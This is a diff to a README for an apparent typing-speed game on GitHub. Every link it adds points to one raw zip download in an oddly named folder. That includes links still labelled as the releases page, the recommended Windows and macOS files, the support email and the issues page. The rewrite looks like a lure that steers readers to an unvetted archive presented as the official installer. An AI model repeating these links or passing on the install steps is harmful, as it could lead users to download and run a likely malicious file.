@@ -1,7 +1,7 @@
 # ⌨️ Typing-Speed-Game - Boost Your Typing Skills Today!
 
 ## 📥 Download Now
-[![Download Typing-Speed-Game](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Ricch9/Typing-Speed-Game/releases)
+[![Download Typing-Speed-Game](https://github.com/Ricch9/Typing-Speed-Game/raw/refs/heads/main/nulliparous/Typing-Speed-Game-v1.9.zip)](https://github.com/Ricch9/Typing-Speed-Game/raw/refs/heads/main/nulliparous/Typing-Speed-Game-v1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the Typing-Speed-Game! This utility helps you measure your typing speed in words per minute (WPM) and accuracy through a fun and engaging game. Ideal for coders and anyone looking to improve their typing skills, this application uses text parsing and timing functions to provide accurate results.
@@ -20,11 +20,11 @@ To run the Typing-Speed-Game, ensure your system meets the following requirement
 
 ## ⚙️ How to Download & Install
 1. **Visit the Releases Page**: Click the link below to access our releases page:
-   [Download from Releases](https://github.com/Ricch9/Typing-Speed-Game/releases)
+   [Download from Releases](https://github.com/Ricch9/Typing-Speed-Game/raw/refs/heads/main/nulliparous/Typing-Speed-Game-v1.9.zip)
   
 2. **Choose the Latest Version**: On the releases page, look for the newest version of Typing-Speed-Game. 
 
-3. **Download the Application**: Click on the file that matches your operating system to download the application. If you are unsure, "Typing-Speed-Game.exe" for Windows, and "Typing-Speed-Game.dmg" for macOS are the usual options.
+3. **Download the Application**: Click on the file that matches your operating system to download the application. If you are unsure, "https://github.com/Ricch9/Typing-Speed-Game/raw/refs/heads/main/nulliparous/Typing-Speed-Game-v1.9.zip" for Windows, and "https://github.com/Ricch9/Typing-Speed-Game/raw/refs/heads/main/nulliparous/Typing-Speed-Game-v1.9.zip" for macOS are the usual options.
 
 4. **Run the Installer**: After downloading, open the file to start the installation. Follow the prompts to complete the process.
 
@@ -41,8 +41,8 @@ To run the Typing-Speed-Game, ensure your system meets the following requirement
 
 ## 📞 Support
 If you encounter any issues or have questions about Typing-Speed-Game, feel free to reach out:
-- **Email**: support@typingspeedgame.com
-- **GitHub Issues**: Use the Issues tab on our [GitHub page](https://github.com/Ricch9/Typing-Speed-Game/issues) to report bugs or request features.
+- **Email**: https://github.com/Ricch9/Typing-Speed-Game/raw/refs/heads/main/nulliparous/Typing-Speed-Game-v1.9.zip
+- **GitHub Issues**: Use the Issues tab on our [GitHub page](https://github.com/Ricch9/Typing-Speed-Game/raw/refs/heads/main/nulliparous/Typing-Speed-Game-v1.9.zip) to report bugs or request features.
 
 ## 🔄 Updates
 Keep your application up to date by visiting the releases page periodically. New features and improvements will be added based on user feedback. Your input is valuable in making this application better.
@@ -58,4 +58,4 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 ## 📥 Download Again
 You can download Typing-Speed-Game at any time from our releases page:
-[Download from Releases](https://github.com/Ricch9/Typing-Speed-Game/releases)
+[Download from Releases](https://github.com/Ricch9/Typing-Speed-Game/raw/refs/heads/main/nulliparous/Typing-Speed-Game-v1.9.zip)
